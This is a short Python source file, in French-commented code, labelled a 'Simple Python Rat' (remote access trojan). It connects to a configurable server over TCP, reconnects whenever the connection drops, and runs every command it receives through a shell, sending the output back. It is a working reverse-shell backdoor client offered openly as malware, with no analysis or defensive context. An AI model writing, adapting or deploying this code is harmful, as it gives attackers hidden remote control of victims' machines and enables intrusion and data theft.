#!/usr/bin/python3

"""

Simple Python Rat
Developped by Tom Escolano - 2016
www.speed09.com/me/

"""

import socket
import subprocess
import sys
import time
import os
import platform

#Fonction de reception des commandes
def cmdrecv():
	cmd = server_co.recv(1024)
	cmd = cmd.decode()
	proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
	stdout_value = proc.stdout.read() + proc.stderr.read()
	if(stdout_value == b''):
		server_co.send(b'Done.')
	else:
		server_co.send(stdout_value)


#Variables de connection
serveur = 'localhost'
port = 25565


#Boucle principale
#Va essayer de se connecter au serveur

while 1:

	try:

		server_co = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		server_co.connect((serveur, port))
		print("[*] Connected")
		#Boucle secondaire
		#Si le client se connecte au serveur, cette boucle sexecutera
		while 1:
			try:
				msg = b''
				cmdrecv()
			except socket.error: #Echapatoire en cas de coupure de connection
				print("[-] Connection error...")
				break
		#Echapatoire en cas de coupure de la session par le serveur
		print("[-] Session Closed")
		server_co.close()
		time.sleep(3)
		print("[*] Reconnecting to the server")

	except socket.error: #Echapatoire dans le cas ou le serveur n'est pas joignable
		print("[-] Can't reach the server...")
		time.sleep(3)
